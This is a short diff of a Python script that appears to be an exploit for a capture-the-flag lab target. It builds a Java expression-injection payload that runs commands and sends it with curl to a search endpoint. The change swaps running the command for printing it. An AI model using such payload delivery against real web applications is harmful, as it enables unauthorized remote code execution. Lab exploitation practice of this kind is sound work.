@@ -251,8 +251,8 @@ end = ").getInputStream())}'"
 done = (final + end)
 done = str(done)
 #print (done)
-os.popen("curl -X POST -F 'name=" + done + " http://10.10.11.170:8080/search")
+#os.popen("curl -X POST -F 'name=" + done + " http://10.10.11.170:8080/search")
 time.sleep(4)
-#print("curl -X POST -F 'name=" + done + " http://10.10.11.170:8080/search")
+print("curl -X POST -F 'name=" + done + " http://10.10.11.170:8080/search") # change the IP if ya need to
 exit()			
 
